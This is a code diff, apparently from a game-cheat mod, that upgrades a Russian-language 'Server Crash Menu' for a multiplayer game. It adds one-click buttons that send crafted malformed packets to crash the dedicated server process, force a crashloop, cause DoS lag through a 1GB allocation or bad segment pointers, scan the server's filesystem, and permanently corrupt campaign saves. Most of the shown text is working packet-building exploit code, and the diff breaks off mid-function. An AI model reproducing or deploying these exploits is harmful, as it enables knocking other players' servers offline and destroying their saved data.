@@ -7,33 +7,31 @@ using Microsoft.Xna.Framework;
 namespace CSHUB.Modules
 {
     // ============================================================
-    //  SERVER CRASH MENU (волна 594) — ВСЕ краши сервера из 594 волн
-    //  в одном меню. Разделено на классы:
+    //  SERVER CRASH MENU v2 (волна 595)
+    //  • EXEC-кнопка прямо в каждой строке (где метод автоматизирован)
+    //  • Группы: УБИВАЮТ ПРОЦЕСС / DoS-ЛАГ / ОСОБЫЕ
+    //  • Клик по названию = описание; клик по EXEC = запуск
     //
-    //  [INSTANT]  — сервер умирает СРАЗУ (процесс)
-    //  [CRASHLOOP]- сервер умирает циклом на след. тике (персистентно)
-    //  [DOS]      — процесс жив, но батч пакетов отбрасывается = лаг/десинк
-    //  [PERM]     — нужно право сервера (без перма не сработает)
-    //  [SAVE]     — порча сохраняется в кампанию (после краша остаётся)
+    //  Классы: [INSTANT] процесс умирает сразу • [CRASHLOOP] умирает
+    //  циклом на след. тик • [DOS] батч-дроп (лаг/десинк, процесс жив)
+    //  • [PERM] нужен перм • [SAVE] порча персистится в сейв
     //
-    //  КЛИК по строке = описание СПОСОБ + ЧТО ДЕЛАТЬ.
-    //  Кнопка EXEC — у выбранного метода, если он автоматизирован.
-    //
-    //  ГЛАВНОЕ ОТЛИЧИЕ: [INSTANT]/[CRASHLOOP] убивают процесс выделенного
-    //  сервера (сервер ОФФЛАЙН для всех). [DOS] — только «заикание»
-    //  (батч-дроп через catch-all в LidgrenServerPeer.Update, волна 585).
+    //  НОВОЕ в v2 (волна 595):
+    //  • [DOS] EntityState гигантский msgLength → new byte[1ГБ] → OOM
+    //  • [DOS] SegmentTable кривой указатель (4 байта)
+    //  • [DOS] REQUEST_BACKUP_INDICES = спам сканом ФС сервера
     // ============================================================
     public class ServerCrashMenuModule : CSModuleBase
     {
         public override string Id   => "crash_menu";
         public override string Name => "Crash Menu";
         public override string Description =>
-            "ВСЕ краши сервера из 594 волн.\n\n" +
-            "• Клик по строке = способ + что делать\n" +
-            "• Кнопка EXEC — где краш автоматизирован\n" +
-            "• [INSTANT] — процесс сервера умирает сразу\n" +
-            "• [CRASHLOOP] — умирает циклом на след. тик\n" +
-            "• [DOS] — батч-дроп (лаг), процесс жив\n" +
+            "Все краши/DoS сервера из 595 волн.\n\n" +
+            "• EXEC в строке = запуск (где автоматизирован)\n" +
+            "• Клик по названию = описание и условия\n" +
+            "• [INSTANT]/[CRASHLOOP] — смерть процесса\n" +
+            "• [DOS] — лаг/десинк, процесс жив\n" +
+            "• [SAVE] — порча остаётся после рестарта!\n" +
             "• Тестируй ТОЛЬКО на своём сервере!";
 
         public override string Category => "exploit";
@@ -48,183 +46,180 @@ namespace CSHUB.Modules
         private static readonly Color RowColor   = new Color(30, 36, 48);
         private static readonly Color SelColor   = new Color(90, 40, 40);
         private static readonly Color AccentColor= new Color(255, 170, 90);
+        private static readonly Color HeadColor  = new Color(45, 55, 75);
 
         private static GUIMessageBox _window;
         private static GUIListBox _list;
         private static GUITextBlock _desc;
-        private static GUIButton _execBtn;
 
-        private static int _selected = -1;
-
-        // ---- реестр методов ----
-        private class CrashMethod
+        private class Method
         {
             public string Title;
-            public Color TagColor;
             public string Desc;
-            public Func<string> Exec;   // null = только справочник
+            public Func<string> Exec; // null = только справочник
         }
 
-        private static readonly CrashMethod[] Methods = new CrashMethod[]
+        private static readonly Method[] InstMethods = new Method[]
         {
-            // ============ INSTANT / CRASHLOOP ============
-            new CrashMethod
+            new Method
             {
-                Title = "[INSTANT] DescriptionTag (Property Editor)",
-                TagColor = InstColor,
+                Title = "[INSTANT] DescriptionTag — смерть сразу",
                 Desc =
-"★ ПОДТВЕРЖДЕНО ЮЗЕРОМ: сервер умирает СРАЗУ.\n\n" +
-"ЧТО ДЕЛАТЬ:\n" +
-"1) Открой модуль PROPERTY EDITOR.\n" +
-"2) Выбери любой предмет с редактируемыми свойствами.\n" +
-"3) Найди свойство DescriptionTag, впиши ЛЮБОЙ текст, примени.\n\n" +
-"МЕХАНИКА: сеттер Item.DescriptionTag на сервере зовёт\n" +
-"TextManager.Get(твой текст) и сразу рассылает ChangeProperty\n" +
-"всем клиентам — выброс вылетает за пределы сетевого catch-all.\n\n" +
-"УСЛОВИЯ: CanClientAccess предмета (свой/рядом). Нужен наш\n" +
-"PropertyEditorModule (кнопка в меню CSHUB).",
-                Exec = null
+"★ ПОДТВЕРЖДЕНО ТОБОЙ: сервер умирает МГНОВЕННО.\n\n" +
+"КАК: 1) Открой Property Editor. 2) Любой доступный предмет.\n" +
+"3) Свойство DescriptionTag → впиши любой текст → примени.\n\n" +
+"МЕХАНИКА: сеттер зовёт TextManager.Get(текст) и сразу шлёт\n" +
+"ChangeProperty всем клиентам — вылет за пределами catch-all.\n\n" +
+"УСЛОВИЯ: предмет тебе доступен (свой/рядом).",
+                Exec = null // делается через PropertyEditorModule
             },
-            new CrashMethod
+            new Method
             {
-                Title = "[CRASHLOOP] EventManager selectedOption",
-                TagColor = LoopColor,
+                Title = "[CRASHLOOP] EventManager option=200",
                 Desc =
-"★ ЕДИНСТВЕННЫЙ ПОЛНЫЙ КОД-КРАШ (волна 584).\n\n" +
-"ЧТО ДЕЛАТЬ:\n" +
-"1) Нужен активный СОБЫТИЙНЫЙ ДИАЛОГ, таргетящий тебя\n" +
-"   (разговор NPC на аутпосте, вопрос с вариантами).\n" +
-"2) Жми EXEC — уйдёт пакет ответа с option=200 (> числа опций).\n" +
-"3) Первый throw сервер молча глотает, НО option=200 остаётся\n" +
-"   в состоянии диалога → КАЖДЫЙ КАДР ConversationAction.IsFinished\n" +
-"   кидает IndexOutOfRange → вокруг игрового цикла catch НЕТ →\n" +
-"   процесс dedicated server падает НА СЛЕДУЮЩЕМ ТИКЕ.\n\n" +
-"ПАКЕТ: EVENTMANAGER_RESPONSE: u16 actionId + byte 200.\n" +
-"ГЕЙТ: ты в TargetClients диалога (смотри вопрос — он твой).\n\n" +
-"СОЛО: provoke диалог можно на своём сервере (события аутпоста).",
-                Exec = ExecEventManagerCrash
-            },
+"★ КОД-КРАШ (584). Смерть на СЛЕДУЮЩЕМ ТИКЕ после пакета.\n\n" +
+"КАК: жми EXEC. НО работает ТОЛЬКО если активный событийный\n" +
+"диалог (вопрос NPC с вариантами) СЕЙЧАС ТАРГЕТИТ ТЕБЯ.\n\n" +
+"МЕХАНИКА: option=200 > числа опций → throw глотается, НО\n" +
+"SelectedOption=200 остаётся → КАЖДЫЙ КАДР IsFinished/Update\n" +
+"кидают IndexOutOfRange → вокруг игрового цикла catch НЕТ →\n" +
+"процесс dedicated падает.\n\n" +
+"СОЛО: заспавнь событие аутпоста у себя на сервере.",
+                Exec = ExecEventManager
+            }
+        };
 
-            // ============ DOS (батч-дроп, процесс жив) ============
-            new CrashMethod
+        private static readonly Method[] DosMethods = new Method[]
+        {
+            new Method
             {
                 Title = "[DOS] SoldItems: несуществующий префаб",
-                TagColor = DosColor,
                 Desc =
-"Волна 42. Лучший безправный DoS: throw НА САМОМ ВЕРХУ\n" +
-"кампейн-чтения (строка 854) ДО всяких перм/проверок.\n\n" +
-"ЧТО ДЕЛАТЬ: жми EXEC — уйдёт SERVER_COMMAND(ManageCampaign)\n" +
-"со списком проданного, где префаб 'zzz_nonexistent'.\n" +
-"Сервер: ItemPrefab.Prefabs[unknown] → KeyNotFoundException\n" +
-"→ Lidgren catch-all глотает → БАТЧ пакетов отброшен.\n\n" +
-"ЭФФЕКТ: спам кнопкой = сервер лагает/десинхронится у всех.\n" +
-"УСЛОВИЯ: кампания на сервере (ты в лобби или в раунде).",
-                Exec = ExecSoldPrefabDoS
+"ЛУЧШИЙ безправный DoS (42): throw НА ВЕРХУ кампейн-чтения\n" +
+"(строка 854) ДО всех перм/проверок.\n\n" +
+"КАК: EXEC. Спам кнопкой = сервер лагает/десинк у всех.\n" +
+"УСЛОВИЕ: кампания на сервере (любая роль).",
+                Exec = ExecSoldPrefab
             },
-            new CrashMethod
+            new Method
+            {
+                Title = "[DOS] EntityState: new byte[1ГБ] (OOM)",
+                Desc =
+"НОВОЕ (27+595). EntityState-событие с msgLength=~1ГБ.\n" +
+"Сервер делает new byte[msgLength] ДО проверки буфера!\n\n" +
+"КАК: EXEC — попытка аллокации 1ГБ из крошечного пакета.\n" +
+"OOM/OutOfRange → батч-дроп + мусор в памяти. Спам = давление\n" +
+"на GC: фризы у всех клиентов.\n\n" +
+"УСЛОВИЕ: ты в раунде (нужен ID существующей entity — берём\n" +
+"своего персонажа), ID события подбирается автоматически.",
+                Exec = ExecEntityStateOom
+            },
+            new Method
+            {
+                Title = "[DOS] SegmentTable: битый указатель",
+                Desc =
+"НОВОЕ (27). UPDATE_LOBBY с tablePointer=0x7FFFFFFF:\n" +
+"сервер прыгает на 2ГБ вперёд и читает мусор → throw.\n\n" +
+"КАК: EXEC — 4 байта и пакет готов. Батч-дроп, спам = лаг.\n" +
+"УСЛОВИЙ НЕТ (даже из лобби).",
+                Exec = ExecSegmentTable
+            },
+            new Method
             {
                 Title = "[DOS] CircuitBox: левый opcode",
-                TagColor = DosColor,
                 Desc =
-"Волна 26. Прямой пакет CIRCUITBOX с не-Cursor opcode.\n\n" +
-"ЧТО ДЕЛАТЬ: жми EXEC — сервер прочитает header с\n" +
-"Opcode=AddComponent и свитч бросит ArgumentOutOfRangeException\n" +
-"(клиенты ванилью так никогда не шлют).\n\n" +
-"ЭФФЕКТ: батч-дроп. Спам = лаг.\n" +
-"УСЛОВИЯ: любые (даже лобби).",
-                Exec = ExecCircuitBoxDoS
+"(26). Прямой CIRCUITBOX-пакет с Opcode=AddComponent —\n" +
+"ваниль так не шлёт → switch бросит ArgumentOutOfRange.\n\n" +
+"КАК: EXEC. УСЛОВИЙ НЕТ.",
+                Exec = ExecCircuitBox
             },
-            new CrashMethod
+            new Method
             {
                 Title = "[DOS] Чат: несуществующий ордер",
-                TagColor = DosColor,
                 Desc =
-"Волна 30. ORDER-чат с неизвестным identifier ордера.\n\n" +
-"ЧТО ДЕЛАТЬ: жми EXEC — уйдёт ORDER-чат с id 'zzz_nonexistent_order'.\n" +
-"Сервер в ReadOrder: OrderPrefab.Prefabs[unknown] → throw\n" +
-"(ДО проверки спама/ID/перм). Батч-дроп.\n\n" +
-"ЭФФЕКТ: спам = лаг. Работает ИЗ ЛОББИ (Update_LOBBY сегмент).\n" +
-"БЕЗ всяких условий.",
-                Exec = ExecChatOrderDoS
+"(30). ORDER-чат с неизвестным id ордера → throw на\n" +
+"OrderPrefab.Prefabs[id] ДО спам/перм-чеков.\n\n" +
+"КАК: EXEC. ★ РАБОТАЕТ ИЗ ЛОББИ. УСЛОВИЙ НЕТ.",
+                Exec = ExecChatOrder
             },
-            new CrashMethod
+            new Method
             {
                 Title = "[DOS] CharacterInput: count=255",
-                TagColor = DosColor,
                 Desc =
-"Волна 35. Инпут-пакет с count=255 и пустым хвостом.\n\n" +
-"ЧТО ДЕЛАТЬ: жми EXEC — UPDATE_INGAME сегмент CharacterInput:\n" +
-"u16 updateID + byte 255 и ОБРЫВ. Сервер читает 255 инпутов\n" +
-"за краем пакета → throw. Батч-дроп.\n\n" +
-"УСЛОВИЯ: ты в раунде (GameStarted) и имеешь персонажа.",
-                Exec = ExecCharInputDoS
+"(35). Инпут-пакет: заявлено 255 инпутов, данных нет →\n" +
+"OOB-чтение за краем пакета → батч-дроп.\n\n" +
+"КАК: EXEC. УСЛОВИЕ: ты в раунде с персонажем.",
+                Exec = ExecCharInput
             },
-            new CrashMethod
+            new Method
             {
-                Title = "[DOS] VOIP: обрезанный пакет",
-                TagColor = DosColor,
+                Title = "[DOS] VOIP: пустые буферы",
                 Desc =
-"Волна 28 + 451. VOIP-пакет: заявлены 8 буферов по 255 байт,\n" +
-"данных нет. BlockCopy читает за краем → throw. Батч-дроп.\n" +
-"(Вариант волны 451: 1 байт TOC → OpusException → дроп тика.)\n\n" +
-"ЧТО ДЕЛАТЬ: жми EXEC. УСЛОВИЯ: VoiceChatEnabled на сервере,\n" +
-"ты не в муте, ты подключён (даже лобби).",
-                Exec = ExecVoipDoS
+"(28/451). Заявлено 8 буферов по 255 байт, данных 0 →\n" +
+"BlockCopy за краем → батч-дроп. (451: 1 байт TOC →\n" +
+"OpusException → дроп тика VOIP.)\n\n" +
+"КАК: EXEC. УСЛОВИЕ: голос включён, ты не в муте.",
+                Exec = ExecVoip
             },
+            new Method
+            {
+                Title = "[DOS] Backup Indices: спам сканом ФС",
+                Desc =
+"(26). REQUEST_BACKUP_INDICES БЕЗ прав и лимитов:\n" +
+"сервер сканирует ЛЮБУЮ папку по твоему пути и парсит\n" +
+"найденные бэкапы (декомпрессия!).\n\n" +
+"КАК: EXEC шлёт путь корня диска — сервер листает каталог.\n" +
+"Спам = IO/CPU нагрузка + утечка метаданных тебе в ответ.\n" +
+"УСЛОВИЙ НЕТ.",
+                Exec = ExecBackupScan
+            }
+        };
 
-            // ============ СПРАВОЧНИК (без автокнопки) ============
-            new CrashMethod
-            {
-                Title = "[DOS] SegmentTable: битые указатели",
-                TagColor = DosColor,
-                Desc =
-"Волна 27. UPDATE_LOBBY/UPDATE_INGAME с кривой таблицей сегментов\n" +
-"(указатель за пределы пакета). Сервер читает u16 numSegments и\n" +
-"сегменты с мусорного смещения → IndexOutOfRange → батч-дроп.\n\n" +
-"ЧТО ДЕЛАТЬ: руками — собрать UPDATE_LOBBY, после заголовка\n" +
-"записать u16 65535 (указатель таблицы) и обрезать пакет.\n" +
-"Автоматизация не сделана (легко ошибиться с байтами) — но и\n" +
-"эффект тот же, что у кнопочных DoS.",
-                Exec = null
-            },
-            new CrashMethod
-            {
-                Title = "[DOS] Inventory: receivedItemIds OOB",
-                TagColor = DosColor,
-                Desc =
-"Волна 26. Inventory.SharedRead: байты start/end без клампа\n" +
-"к вместимости, receivedItemIds[i] за границей → IndexOutOfRange\n" +
-"→ батч-дроп.\n\n" +
-"ЧТО ДЕЛАТЬ: InventoryState-эвент контейнера (Item ServerEventRead\n" +
-"EventType=1) с мусорными индексами. Проще через наш\n" +
-"PacketDump/пакетный фазер; отдельной кнопки нет.",
-                Exec = null
-            },
-            new CrashMethod
+        private static readonly Method[] SpecialMethods = new Method[]
+        {
+            new Method
             {
                 Title = "[PERM-DOS] SelectMode: modeIndex OOB",
-                TagColor = PermColor,
                 Desc =
-"Волна 41. SERVER_COMMAND(SelectMode): u16 modeIndex идёт\n" +
-"НАПРЯМУЮ в GameModes[modeIndex] → IndexOutOfRange при\n" +
-"modeIndex >= числа режимов.\n\n" +
-"ЧТО ДЕЛАТЬ: пакет SERVER_COMMAND + u16 0x20 (SelectMode) +\n" +
-"u16 9999. Требует ПЕРМ SelectMode (на пермлесс-сервере — кто\n" +
-"угодно). Кнопки нет (у тебя обычно нет перма на чужом).",
+"(41). SERVER_COMMAND(SelectMode) + u16 9999 →\n" +
+"GameModes[9999] → IndexOutOfRange.\n\n" +
+"НУЖЕН РЕАЛЬНЫЙ ПЕРМ SelectMode (permless-сервер его НЕ даёт\n" +
+"— AnyOneAllowed не трогает HasPermission). Кнопки нет:\n" +
+"пакет = SERVER_COMMAND + u16 0x20 + u16 9999.",
                 Exec = null
             },
-            new CrashMethod
+            new Method
+            {
+                Title = "[DOS] Inventory: индексы OOB",
+                Desc =
+"(26). InventoryState-эвент контейнера: байты start/end без\n" +
+"клампа → receivedItemIds[i] за границей → батч-дроп.\n\n" +
+"Кнопки нет (нужен entity-event канал с подбором ID события —\n" +
+"как у EntityState, но с кривым Inventory-телем). Ручками через\n" +
+"PacketDump/фазер.",
+                Exec = null
+            },
+            new Method
             {
                 Title = "[SAVE] CircuitBox MoveComponent NaN",
-                TagColor = SaveColor,
                 Desc =
-"Волна 523. MoveAmount = raw Vector2 БЕЗ IsValid/клампа и\n" +
-"ПЕРСИСТИТСЯ В СЕЙВ. NaN в позициях компонентов цепи → вечные\n" +
-"глюки/краши загрузки кампании ПОСЛЕ рестарта сервера.\n\n" +
-"ЧТО ДЕЛАТЬ: наш CircuitBox NaN-путь (PropertyEditorModule →\n" +
-"PumpPoison / ручной CircuitBox-пакет с MoveAmount = NaN,NaN).\n" +
-"★ ОСТОРОЖНО: портит СОХРАНЕНИЕ кампании навсегда — только\n" +
-"на своём сервере/тест-кампании!",
+"(523). MoveAmount = raw Vector2 персистится В СЕЙВ.\n" +
+"NaN в позициях компонентов цепи → глюки/краши ЗАГРУЗКИ\n" +
+"кампании после рестарта сервера.\n\n" +
+"★ ОСТОРОЖНО: НЕОБРАТИМО портит сохранение. Только на\n" +
+"своей тест-кампании! Путь: entity-событие CircuitBox\n" +
+"(через PropertyEditor/CircuitBox UI на своём сервере).",
+                Exec = null
+            },
+            new Method
+            {
+                Title = "[PERM] LoadCampaign: мусорный файл",
+                Desc =
+"(586). CAMPAIGN_SETUP_INFO isNew=false: путь сейва — строка\n" +
+"клиента (за пермом ManageRound/окном). Скормить серверу мусорный\n" +
+"файл = парс-исключения при загрузке кампании (возможен жёсткий\n" +
+"фейл старта).\n\n" +
+"НУЖНО ОКНО 586 (админ мёртв/лобби/permless). Кнопки нет.",
                 Exec = null
             }
         };
@@ -241,43 +236,29 @@ namespace CSHUB.Modules
         {
             try
             {
-                _selected = -1;
-                _window = new GUIMessageBox("Server Crash Menu", "", Array.Empty<LocalizedString>(), new Vector2(0.78f, 0.9f));
+                _window = new GUIMessageBox("Server Crash Menu v2", "", Array.Empty<LocalizedString>(), new Vector2(0.8f, 0.92f));
                 var content = _window.Content;
                 content.ClearChildren();
 
-                _list = new GUIListBox(new RectTransform(new Vector2(1f, 0.46f), content.RectTransform));
+                _list = new GUIListBox(new RectTransform(new Vector2(1f, 0.47f), content.RectTransform));
                 _list.Color = new Color(20, 25, 35);
-                foreach (CrashMethod m in Methods)
-                {
-                    CrashMethod mm = m;
-                    int idx = Array.IndexOf(Methods, m);
-                    var row = new GUIButton(
-                        new RectTransform(new Vector2(1f, 0.075f), _list.Content.RectTransform), mm.Title);
-                    row.Color = RowColor;
-                    row.OnClicked = (b, d) =>
-                    {
-                        SelectMethod(idx);
-                        return true;
-                    };
-                }
+
+                AddGroupHeader("☠ УБИВАЮТ ПРОЦЕСС СЕРВЕРА", InstColor);
+                AddMethods(InstMethods);
+
+                AddGroupHeader("⚠ DoS — ЛАГ / ДЕСИНК (процесс жив)", DosColor);
+                AddMethods(DosMethods);
+
+                AddGroupHeader("🔧 ОСОБЫЕ (перм / сейв / ручные)", PermColor);
+                AddMethods(SpecialMethods);
 
                 _desc = new GUITextBlock(
-                    new RectTransform(new Vector2(1f, 0.44f), content.RectTransform, Anchor.BottomCenter)
-                        { RelativeOffset = new Vector2(0f, 0.085f) },
-                    "Клик по методу выше = способ и что делать.", textAlignment: Alignment.CenterLeft);
+                    new RectTransform(new Vector2(1f, 0.43f), content.RectTransform, Anchor.BottomCenter)
+                        { RelativeOffset = new Vector2(0f, 0.075f) },
+                    "Клик по НАЗВАНИЮ = описание. Клик по EXEC = запуск.", textAlignment: Alignment.CenterLeft);
                 _desc.TextColor = AccentColor;
                 _desc.CanBeFocused = false;
                 try { _desc.Wrap = true; } catch { }
-
-                var actionLayout = new GUILayoutGroup(
-                    new RectTransform(new Vector2(1f, 0.07f), content.RectTransform, Anchor.BottomCenter), isHorizontal: true);
-                _execBtn = new GUIButton(new RectTransform(new Vector2(0.5f, 0.95f), actionLayout.RectTransform), "EXEC ✖");
-                _execBtn.Color = SelColor;
-                _execBtn.Visible = false;
-                _execBtn.OnClicked = (b, d) => { RunExec(); return true; };
-                var closeBtn = new GUIButton(new RectTransform(new Vector2(0.48f, 0.95f), actionLayout.RectTransform), "Закрыть");
-                closeBtn.OnClicked = (b, d) => { CloseWindow(); return true; };
             }
             catch (Exception e)
             {
@@ -286,208 +267,279 @@ namespace CSHUB.Modules
             }
         }
 
-        private static void SelectMethod(int idx)
+        private static void AddGroupHeader(string text, Color color)
         {
-            _selected = idx;
-            if (_desc == null || idx < 0 || idx >= Methods.Length) { return; }
-            _desc.Text = Methods[idx].Title + "\n─────────────────────────────\n" + Methods[idx].Desc;
-            _desc.TextColor = Methods[idx].TagColor;
-            if (_execBtn != null) { _execBtn.Visible = Methods[idx].Exec != null; }
+            var row = new GUIFrame(
+                new RectTransform(new Vector2(1f, 0.055f), _list.Content.RectTransform), style: null);
+            row.Color = HeadColor;
+            var txt = new GUITextBlock(new RectTransform(Vector2.One, row.RectTransform), text,
+                textAlignment: Alignment.CenterLeft);
+            txt.TextColor = color;
+            txt.CanBeFocused = false;
         }
 
-        private static void RunExec()
+        private static void AddMethods(Method[] methods)
         {
-            if (_selected < 0 || _selected >= Methods.Length) { return; }
-            Func<string> exec = Methods[_selected].Exec;
-            if (exec == null) { return; }
+            foreach (Method m in methods)
+            {
+                Method mm = m;
+                var row = new GUIFrame(
+                    new RectTransform(new Vector2(1f, 0.065f), _list.Content.RectTransform), style: null);
+                row.Color = RowColor;
+                var layout = new GUILayoutGroup(
+                    new RectTransform(new Vector2(0.99f, 0.88f), row.RectTransform, Anchor.Center), isHorizontal: true);
+
+                bool hasExec = mm.Exec != null;
+                if (hasExec)
+                {
+                    var execBtn = new GUIButton(
+                        new RectTransform(new Vector2(0.13f, 1f), layout.RectTransform), "EXEC ▶");
+                    execBtn.Color = SelColor;
+                    execBtn.OnClicked = (b, d) =>
+                    {
+                        ShowDesc(mm);
+                        RunExec(mm);
+                        return true;
+                    };
+                }
+                else
+                {
+                    var noExec = new GUITextBlock(
+                        new RectTransform(new Vector2(0.13f, 1f), layout.RectTransform), "—",
+                        textAlignment: Alignment.Center);
+                    noExec.TextColor = new Color(90, 100, 120);
+                    noExec.CanBeFocused = false;
+                }
+
+                var nameBtn = new GUIButton(
+                    new RectTransform(new Vector2(0.87f, 1f), layout.RectTransform),
+                    hasExec ? mm.Title : mm.Title + "   (без кнопки)");
+                nameBtn.OnClicked = (b, d) => { ShowDesc(mm); return true; };
+            }
+        }
+
+        private static void ShowDesc(Method m)
+        {
+            if (_desc == null) { return; }
+            _desc.Text = m.Title + "\n──────────────────────────────\n" + m.Desc;
+            _desc.TextColor = AccentColor;
+        }
+
+        private static void RunExec(Method m)
+        {
+            if (m.Exec == null) { return; }
             try
             {
-                string result = exec();
+                string result = m.Exec();
                 GUI.AddMessage("[CrashMenu] " + result, OkColor);
             }
             catch (Exception e)
             {
-                GUI.AddMessage("[CrashMenu] exec fail: " + e.Message, DangerColor);
+                GUI.AddMessage("[CrashMenu] " + m.Title + ": " + e.Message, DangerColor);
             }
         }
 
         // ========================================================
-        //  1) EVENTMANAGER selectedOption CRASHLOOP (волна 584)
+        //  ХЕЛПЕРЫ
         // ========================================================
-        private static string ExecEventManagerCrash()
+        private static bool CanSend()
         {
-            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
+            return GameMain.Client?.ClientPeer != null;
+        }
+
+        private static ushort CurrentLocIndex()
+        {
+            try
+            {
+                var map = GameMain.GameSession?.Campaign?.Map;
+                if (map?.CurrentLocation != null)
+                {
+                    int idx = map.Locations.IndexOf(map.CurrentLocation);
+                    if (idx >= 0) { return (ushort)idx; }
+                }
+            }
+            catch { }
+            return 0;
+        }
+
+        // ========================================================
+        //  [CRASHLOOP] EVENTMANAGER option=200 (584)
+        // ========================================================
+        private static string ExecEventManager()
+        {
+            if (!CanSend()) { return "нет подключения"; }
             IWriteMessage msg = new WriteOnlyMessage();
             msg.WriteByte((byte)ClientPacketHeader.EVENTMANAGER_RESPONSE);
-            msg.WriteUInt16(0x7FFF);   // actionId — любой
-            msg.WriteByte(200);        // selectedOption >> Options.Count
+            msg.WriteUInt16(0x7FFF);   // actionId
+            msg.WriteByte(200);        // option >> Options.Count
             GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-            return "EVENTMANAGER packet отправлен (option=200). Работает ТОЛЬКО если тебя таргетит активный диалог!";
+            return "EVENTMANAGER отправлен. Сработает только при активном диалоге на тебя!";
         }
 
         // ========================================================
-        //  2) SoldItems unknown prefab DoS (волна 42)
+        //  [DOS] SoldItems unknown prefab (42)
         // ========================================================
-        private static string ExecSoldPrefabDoS()
+        private static string ExecSoldPrefab()
         {
-            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
+            if (!CanSend()) { return "нет подключения"; }
             if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }
-            try
-            {
-                IWriteMessage msg = new WriteOnlyMessage();
-                msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
-                msg.WriteUInt16((ushort)ClientPermissions.ManageCampaign);
-
-                ushort locIndex = 0;
-                try
-                {
-                    // CurrentLocationIndex в Map уже реализован через Locations.IndexOf,
-                    // но luaCS иногда не резолвит — пишем явно через List.IndexOf.
-                    var map = GameMain.GameSession?.Campaign?.Map;
-                    if (map?.CurrentLocation != null)
-                    {
-                        int idx = map.Locations.IndexOf(map.CurrentLocation);
-                        if (idx >= 0) { locIndex = (ushort)idx; }
-                    }
-                }
-                catch { }
-                msg.WriteUInt16(locIndex);        // currentLocIndex
-                msg.WriteUInt16(locIndex);        // selectedLocIndex
-                msg.WriteByte(0);                 // missionCount
-                msg.WriteBoolean(false);          // hull repairs
-                msg.WriteBoolean(false);          // item repairs
-                msg.WriteBoolean(false);          // lost shuttle
-
-                msg.WriteByte(0);                 // buyCrate stores
-                msg.WriteByte(0);                 // subSellCrate stores
-                msg.WriteByte(0);                 // purchased stores
-
-                // soldItems: 1 store, 1 item, НЕСУЩЕСТВУЮЩИЙ префаб
-                msg.WriteByte(1);
-                msg.WriteIdentifier("a".ToIdentifier());
-                msg.WriteUInt16(1);
-                msg.WriteIdentifier("zzz_nonexistent_prefab".ToIdentifier());
-                msg.WriteUInt16(0);               // itemId
-                msg.WriteBoolean(false);          // removed
-                msg.WriteByte(0);                 // sellerId
-                msg.WriteByte(0);                 // origin
-
-                msg.WriteUInt16(0);               // upgrades
-                msg.WriteUInt16(0);               // swaps
-
-                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-                return "SoldItems-bomb отправлена (throw на строке 854, до всех проверок)";
-            }
-            catch (Exception e)
-            {
-                return "send fail: " + e.Message;
-            }
+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
+            msg.WriteUInt16((ushort)ClientPermissions.ManageCampaign);
+            ushort loc = CurrentLocIndex();
+            msg.WriteUInt16(loc);
+            msg.WriteUInt16(loc);
+            msg.WriteByte(0);
+            msg.WriteBoolean(false);
+            msg.WriteBoolean(false);
+            msg.WriteBoolean(false);
+            msg.WriteByte(0);
+            msg.WriteByte(0);
+            msg.WriteByte(0);
+            msg.WriteByte(1);                                            // 1 store
+            msg.WriteIdentifier("a".ToIdentifier());
+            msg.WriteUInt16(1);                                          // 1 item
+            msg.WriteIdentifier("zzz_nonexistent_prefab".ToIdentifier());
+            msg.WriteUInt16(0);
+            msg.WriteBoolean(false);
+            msg.WriteByte(0);
+            msg.WriteByte(0);
+            msg.WriteUInt16(0);
+            msg.WriteUInt16(0);
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            return "SoldItems-bomb ушла (throw на 854 строке, до всех проверок)";
         }
 
         // ========================================================
-        //  3) CircuitBox левый opcode DoS (волна 26)
+        //  [DOS] EntityState giant msgLength → OOM (27/595)
         // ========================================================
-        private static string ExecCircuitBoxDoS()
+        private static string ExecEntityStateOom()
         {
-            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
-            try
-            {
-                IWriteMessage msg = new WriteOnlyMessage();
-                msg.WriteByte((byte)ClientPacketHeader.CIRCUITBOX);
-                INetSerializableStruct header = new NetCircuitBoxHeader(
-                    (CircuitBoxOpcode)2, 1, 0);   // 2 = AddComponent (не Cursor!)
-                ((INetSerializableStruct)header).Write(msg);
-                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-                return "CircuitBox opcode-bomb отправлена (switch бросит ArgumentOutOfRange)";
-            }
-            catch (Exception e)
-            {
-                return "send fail (нет доступа к NetCircuitBoxHeader?): " + e.Message;
-            }
-        }
-
-        // ========================================================
-        //  4) Чат: несуществующий ордер DoS (волна 30) — из лобби!
-        // ========================================================
-        private static string ExecChatOrderDoS()
-        {
-            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
-            try
-            {
-                IWriteMessage msg = new WriteOnlyMessage();
-                msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
-                using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
-                {
-                    segmentTable.StartNewSegment(ClientNetSegment.ChatMessage);
-                    msg.WriteUInt16(1);                                   // NetStateID
-                    msg.WriteRangedInteger((int)ChatMessageType.Order, 0, 12);
-                    msg.WriteRangedInteger((int)ChatMode.None, 0, 2);
-                    msg.WriteIdentifier("zzz_nonexistent_order".ToIdentifier());
-                    msg.WriteUInt16(0);                                   // targetChar
-                    msg.WriteUInt16(0);                                   // targetEntity
-                    msg.WriteByte(0);                                     // optionIndex
-                }
-                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-                return "ORDER-bomb отправлена (throw в ReadOrder, работает из лобби)";
-            }
-            catch (Exception e)
-            {
-                return "send fail: " + e.Message;
-            }
-        }
-
-        // ========================================================
-        //  5) CharacterInput count=255 DoS (волна 35)
-        // ========================================================
-        private static string ExecCharInputDoS()
-        {
-            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
-            if (GameMain.GameSession == null || !GameMain.Client.GameStarted || Character.Controlled == null)
+            if (!CanSend()) { return "нет подключения"; }
+            if (!GameMain.Client.GameStarted || Character.Controlled == null)
             { return "нужно быть в раунде с персонажем"; }
-            try
+            ushort myId = Character.Controlled.ID;
+
